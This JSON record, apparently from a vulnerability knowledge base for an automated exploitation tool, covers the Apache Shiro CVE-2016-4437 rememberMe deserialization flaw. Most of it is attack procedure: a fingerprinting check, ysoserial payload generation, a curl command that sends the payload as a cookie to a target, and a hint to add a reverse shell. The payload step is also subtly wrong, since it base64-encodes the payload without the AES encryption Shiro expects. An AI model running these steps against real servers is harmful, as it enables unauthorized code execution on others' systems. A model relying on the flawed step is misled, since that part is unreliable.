{
  "vuln_id": "shiro_cve2016_4437",
  "description": "Apache Shiro 1.2.4及之前版本存在Java反序列化漏洞，攻击者可通过构造恶意的rememberMe Cookie实现远程代码执行",
  "category": "java_deserialization",
  "cves": [
    "CVE-2016-4437"
  ],
  "match_keywords": [
    "shiro",
    "apache shiro",
    "CVE-2016-4437",
    "shiro-550",
    "rememberMe",
    "java反序列化"
  ],
  "fingerprint_keywords": [
    "Set-Cookie: rememberMe=deleteMe",
    "shiro",
    "JSESSIONID"
  ],
  "affected_versions": "Apache Shiro <= 1.2.4",
  "default_port": 8080,
  "common_endpoints": [
    "/",
    "/admin",
    "/login",
    "/logout"
  ],
  "detection_method": "发送GET请求到目标URL，检查响应头中是否包含Set-Cookie: rememberMe=deleteMe，如果存在则表明目标使用Shiro框架且可能受漏洞影响",
  "exploit_steps": [
    {
      "step": 1,
      "description": "使用ysoserial生成CommonsCollections2 payload并编码为rememberMe Cookie",
      "command": "java -jar ysoserial.jar CommonsCollections2 'touch /tmp/success' > payload.bin && python -c \"import sys, base64; print(base64.b64encode(open('payload.bin','rb').read()).decode())\"",
      "expected_result": "生成base64编码的payload字符串",
      "notes": "需要安装ysoserial工具，可使用其他CommonsCollections变体如CommonsCollections1/3/4/5/6/7"
    },
    {
      "step": 2,
      "description": "发送包含恶意rememberMe Cookie的HTTP请求",
      "command": "curl -v http://{TARGET}/ -H 'Cookie: rememberMe={BASE64_PAYLOAD}'",
      "expected_result": "返回正常HTTP响应（200/302等），并在目标服务器上执行命令",
      "notes": "将{BASE64_PAYLOAD}替换为上一步生成的base64字符串，注意Cookie值不要包含引号"
    }
  ],
  "verification_command": "curl -v http://{TARGET}/ -H 'Cookie: rememberMe=dGVzdA=='",
  "verification_success_sign": "响应头中包含Set-Cookie: rememberMe=deleteMe",
  "requires_callback": false,
  "callback_note": "此漏洞通过反序列化直接执行命令，不需要目标回连。如需反弹shell，可在payload中使用bash/python反弹命令",
  "remediation": "升级到Apache Shiro 1.2.5及以上版本，或配置shiro.rememberMe.cipherKey为强随机密钥",
  "tags": [
    "java",
    "反序列化",
    "cookie",
    "rce",
    "apache"
  ],
  "search_text": "Apache Shiro 1.2.4及之前版本存在Java反序列化漏洞，攻击者可通过构造恶意的rememberMe Cookie实现远程代码执行 java_deserialization CVE-2016-4437 shiro apache shiro CVE-2016-4437 shiro-550 rememberMe java反序列化 Set-Cookie: rememberMe=deleteMe shiro JSESSIONID 发送GET请求到目标URL，检查响应头中是否包含Set-Cookie: rememberMe=deleteMe，如果存在则表明目标使用Shiro框架且可能受漏洞影响 Apache Shiro <= 1.2.4 java 反序列化 cookie rce apache 使用ysoserial生成CommonsCollections2 payload并编码为rememberMe Cookie 发送包含恶意rememberMe Cookie的HTTP请求",
